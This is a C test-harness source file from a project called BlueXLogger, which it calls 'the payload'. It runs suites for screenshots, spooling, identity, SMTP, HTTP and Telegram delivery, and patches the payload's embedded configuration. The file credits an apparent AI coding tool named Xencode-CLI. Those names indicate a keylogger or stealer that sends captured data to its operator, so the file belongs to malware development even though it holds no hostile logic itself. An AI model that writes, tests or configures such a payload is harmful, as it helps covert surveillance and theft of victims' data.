/*============================================================================
 * BlueXLogger - tests/main.c
 * CLI-runnable test harness.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * Usage:  bxl_tests.exe [path\to\BlueXLogger.exe]
 *
 * The optional argument is the freshly built payload. When it is supplied the
 * configuration suite additionally patches a real copy of the payload and
 * reads the settings back out of the embedded RCDATA slot; without it that
 * one group prints a skip note.
 *==========================================================================*/
#include "tests.h"
#include "bxl_util.h"

wchar_t g_payload_exe[1024];

static void banner(void)
{
    char host[128];
    bxl_hostname(host, sizeof(host));

    printf("\n");
    printf("======================================================\n");
    printf("  %s - automated test suite\n", BXL_PRODUCT_NAME);
    printf("  %s\n", BXL_WATERMARK);
    printf("  version %s   host %s\n", BXL_VERSION_STR, host);
    printf("======================================================\n");
    printf("  payload under test: %ls\n",
           g_payload_exe[0] ? g_payload_exe : L"(none supplied)");
}

int wmain(int argc, wchar_t **argv)
{
    if (argc > 1 && argv[1] && argv[1][0])
        StringCchCopyW(g_payload_exe, BXL_COUNT_OF(g_payload_exe), argv[1]);

    banner();

    test_format();
    test_config();
    test_schedule();
    test_smtp();
    test_http();
    test_telegram();
    test_identity();
    test_spool();
    test_screenshot();

    t_summary();
    return t_exit_code();
}
